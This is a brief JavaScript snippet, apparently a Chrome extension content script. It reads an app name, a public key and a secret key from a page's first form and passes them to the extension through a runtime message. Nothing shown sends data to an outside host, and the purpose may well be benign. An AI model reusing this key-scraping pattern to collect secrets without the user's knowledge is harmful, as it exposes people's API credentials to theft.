try {
	var pk= document.forms[0].elements[2].value ;
	var sk= document.forms[0].elements[3].value ;
	var app= document.forms[0].elements[0].value ;

	chrome.runtime.sendMessage(
		{
			publicKey: pk,
			secretKey: sk,
			app: app
		});
}
catch (e) {
	chrome.runtime.sendMessage(
		{
			publicKey: 'n/a',
			secretKey: 'n/a',
			app: 'n/a'
		});
}
